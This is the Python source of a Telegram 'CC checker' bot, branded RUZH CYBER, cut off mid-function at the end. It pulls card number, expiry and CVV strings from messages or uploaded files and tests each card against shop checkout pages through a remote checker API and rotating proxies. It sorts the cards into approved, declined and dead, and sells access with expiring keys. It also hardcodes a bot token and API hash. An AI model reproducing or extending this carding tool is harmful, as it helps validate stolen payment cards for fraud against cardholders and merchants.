from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
from datetime import datetime, timedelta

# ================================================================
# RUZH CYBER - CC CHECKER BOT v7.0
# AUTHOR: RUZH CYBER
# STATUS: ELITE EDITION WITH REDEEM SYSTEM
# ================================================================

# ─── CONFIG ───
CHECKER_API_URL = 'http://62.72.20.10:8081/'

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
    "🔑": "6026367225466720832",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ─── BOT TOKEN ───
API_ID = 39407140
API_HASH = '1f11d571c39a98e155cc43a326a92736'
BOT_TOKEN = '8727643641:AAEZKxHjXWTXl32lyBf9EDhxL2u1JY9QPDU'

# ─── FILES ───
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
KEYS_FILE = 'keys.txt'  # فایلی کلیلەکان

bot = TelegramClient('ruzh_checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

# ─── KEY SYSTEM ───

def load_keys():
    """بارکردنی کلیلەکان لە فایلەوە"""
    keys = {}
    if not os.path.exists(KEYS_FILE):
        return keys
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    parts = line.split('|')
                    if len(parts) >= 3:
                        key = parts[0]
                        user_id = parts[1]
                        expiry = parts[2]
                        keys[key] = {'user_id': user_id, 'expiry': expiry}
    except:
        pass
    return keys

def save_key(key, user_id, expiry):
    """پاشەکەوتکردنی کلیلێک"""
    with open(KEYS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{key}|{user_id}|{expiry}\n")

def is_key_valid(key):
    """پشکنینی دروستبوونی کلیل"""
    keys = load_keys()
    if key not in keys:
        return False, None
    expiry = keys[key]['expiry']
    if expiry == 'permanent':
        return True, keys[key]['user_id']
    try:
        expiry_date = datetime.strptime(expiry, '%Y-%m-%d')
        if datetime.now() <= expiry_date:
            return True, keys[key]['user_id']
    except:
        pass
    return False, None

def generate_key(days):
    """دروستکردنی کلیل بە ژمارەی ڕۆژ"""
    key = secrets.token_hex(8).upper()
    expiry_date = datetime.now() + timedelta(days=days)
    return key, expiry_date.strftime('%Y-%m-%d')

def is_premium(user_id):
    """پشکنینی پریمیۆم بوون (لە premium.txt یان کلیل)"""
    if str(user_id) in get_file_lines(PREMIUM_FILE):
        return True
    # پشکنینی ئەگەر ئایدیەکە لە کلیلەکاندا هەیە
    keys = load_keys()
    for k, v in keys.items():
        if v['user_id'] == str(user_id):
            if v['expiry'] == 'permanent':
                return True
            try:
                expiry_date = datetime.strptime(v['expiry'], '%Y-%m-%d')
                if datetime.now() <= expiry_date:
                    return True
            except:
                pass
    return False

# ─── HELPERS ───
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return (
                    data.get('brand', '-'),
                    data.get('type', '-'),
                    data.get('level', '-'),
                    data.get('bank', '-'),
                    data.get('country_name', '-'),
                    data.get('country_flag', '')
                )
    except:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid', 'message': 'Invalid card', 'card': card}

        params = {'cc': card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        # گۆڕینی Charged بۆ Approved و ناردنی declined
        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(k in response_lower for k in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'declined' in response_lower or 'denied' in response_lower or 'failed' in response_lower:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    # گۆڕینی hit_type بۆ Approved لە جیاتی Charged
    if hit_type == "Charged":
        hit_type = "Approved"
    
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝" if hit_type == "Approved" else "𝐋𝐢𝐯𝐞"
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    msg = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

    try:
        await bot.send_message(user_id, premium_emoji(msg), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['approved'][0]['gateway'] if results['approved'] else 'Unknown'

    text = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Approved: {len(results['approved'])} | ❌ Declined: {len(results['declined'])} | 💀 Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['approved']:
        for r in results['approved'][:10]:
            hits_text += f"✅ <code>{r['card']}</code> | {r.get('gateway', 'Unknown')}\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['approved'][0]['gateway'] if results['approved'] else 'Unknown'

    summary = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Approved: {len(results['approved'])} | ❌ Declined: {len(results['declined'])} | 💀 Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ruzh_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 RUZH CYBER CC CHECKER RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")
        await f.write(f"❌ DECLINED ({len(results['declined'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['declined']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")
        await f.write(f"💀 DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

# ─── COMMANDS ───

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(premium_emoji(
        "<b>⚡💳 Welcome to RUZH CYBER CC Checker! 💳⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>⚡💠 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
        "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
        "• /chk - Reply to .txt file to check cards</blockquote>\n"
        "<b>⚡💠 𝐊𝐞𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
        "<blockquote>• /redeem KEY - Activate your key\n"
        "• /genkey 1|2|7|30 - Generate key (Admin only)\n"
        "• /keys - List all keys (Admin only)\n"
        "• /delkey KEY - Delete a key (Admin only)</blockquote>\n"
        "<b>⚡💠 𝐒𝐢𝐭𝐞 & 𝐏𝐫𝐨𝐱𝐲</b>\n"
        "<blockquote>• /fuck - Check all sites\n"
        "• /proxy - Check all proxies</blockquote>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>🔑 Use /redeem YOUR_KEY to activate</b>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_command(event):
    user_id = event.sender_id
    args = event.message.text.split()
    
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Please provide a key: <code>/redeem YOUR_KEY</code>"), parse_mode='html')
        return
    
    key = args[1].upper()
    valid, key_user_id = is_key_valid(key)
    
    if not valid:
        await event.reply(premium_emoji("❌ Invalid or expired key!"))
        return
    
    # ئەگەر ئایدی کەسێکی تر بەکارهێنابوو
    if key_user_id and str(key_user_id) != str(user_id):
        await event.reply(premium_emoji("❌ This key belongs to another user!"))
        return
    
    # کلیل دروستە، بەکارهێنەر چالاک دەکەین
    keys = load_keys()
    expiry = keys[key]['expiry']
    days_left = "Permanent" if expiry == 'permanent' else f"{ (datetime.strptime(expiry, '%Y-%m-%d') - datetime.now()).days } days left"
    
    await event.reply(premium_emoji(
        f"<b>✅ Key activated successfully!</b>\n"
        f"<blockquote>🔑 Key: <code>{key}</code></blockquote>\n"
        f"<blockquote>⏳ Expiry: {days_left}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>⚡ You can now use all bot commands!</b>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkey'))
async def genkey_command(event):
    user_id = event.sender_id
    
    # تەنها بەکارهێنەری پریمیۆم یان ئەدمین
    admin_ids = ['8496671308', '5248903529']  # ئایدی ئەدمینەکان
    if str(user_id) not in admin_ids and not is_premium(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji(
            "❌ Usage:\n"
            "<code>/genkey 1</code> - 1 day key\n"
            "<code>/genkey 2</code> - 2 days key\n"
            "<code>/genkey 7</code> - 7 days key\n"
            "<code>/genkey 30</code> - 30 days key\n"
            "<code>/genkey permanent</code> - Permanent key"
        ), parse_mode='html')
        return
    
    days_arg = args[1]
    if days_arg.lower() == 'permanent':
        days = 36500  # ~100 years
        expiry_text = 'permanent'
    else:
        try:
            days = int(days_arg)
            if days <= 0:
                await event.reply(premium_emoji("❌ Days must be positive!"))
                return
        except:
            await event.reply(premium_emoji("❌ Invalid days!"))
            return
    
    key, expiry_date = generate_key(days)
    if days_arg.lower() == 'permanent':
        expiry_date = 'permanent'
    
    # پاشەکەوتکردنی کلیل
    save_key(key, str(user_id), expiry_date)
    
    days_text = "Permanent" if expiry_date == 'permanent' else f"{days} days"
    await event.reply(premium_emoji(
        f"<b>✅ Key generated successfully!</b>\n"
        f"<blockquote>🔑 Key: <code>{key}</code></blockquote>\n"
        f"<blockquote>⏳ Duration: {days_text}</blockquote>\n"
        f"<blockquote>📅 Expiry: {expiry_date}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>Share this key with your friends!</b>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/keys'))
async def list_keys_command(event):
    user_id = event.sender_id
    
    admin_ids = ['8496671308', '5248903529']
    if str(user_id) not in admin_ids:
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    keys = load_keys()
    if not keys:
        await event.reply(premium_emoji("📭 No keys found."))
        return
    
    text = "<b>🔑 Keys List:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for k, v in keys.items():
        status = "✅ Active" if is_key_valid(k)[0] else "❌ Expired"
        text += f"<code>{k}</code> | User: {v['user_id']} | {v['expiry']} | {status}\n"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/delkey'))
async def delete_key_command(event):
    user_id = event.sender_id
    
    admin_ids = ['8496671308', '5248903529']
    if str(user_id) not in admin_ids:
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/delkey KEY</code>"), parse_mode='html')
        return
    
    key_to_delete = args[1].upper()
    keys = load_keys()
    
    if key_to_delete not in keys:
        await event.reply(premium_emoji("❌ Key not found!"))
        return
    
    # سڕینەوەی کلیل
    with open(KEYS_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    with open(KEYS_FILE, 'w', encoding='utf-8') as f:
        for line in lines:
            if not line.startswith(key_to_delete + '|'):
                f.write(line)
    
    await event.reply(premium_emoji(f"✅ Key <code>{key_to_delete}</code> deleted!"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied. Please redeem a key using /redeem KEY"), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ No sites or proxies available."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"<b>⚡ Checking: <code>{card}</code></b>"), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Approved':
            status_emoji, status_text = "✅", "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
        elif result['status'] == 'Declined':
            status_emoji, status_text = "❌", "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        else:
            status_emoji, status_text = "💀", "𝐃𝐞𝐚𝐝"

        final = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

        await status_msg.edit(premium_emoji(final), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied. Please redeem a key using /redeem KEY"))
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file."))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."))
        return

    if not load_sites() or not load_proxies():
        await event.reply(premium_emoji("❌ No sites or proxies available."))
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing file..."))
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)
    os.remove(file_path)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found."))
        return

    if len(cards) > 5000:
        cards = cards[:5000]
        await status_msg.edit(premium_emoji(f"⚠️ Limiting to 5000 cards."))

    total = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 Checking {total} cards..."))

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    results = {
        'approved': [],
        'declined': [],
        'dead': [],
        'total': total,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for c in cards:
            queue.put_nowait(c)

        last_update = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                state = active_sessions.get(session_key)
                if not state:
                    break
                while state.get('paused', False):
                    await asyncio.sleep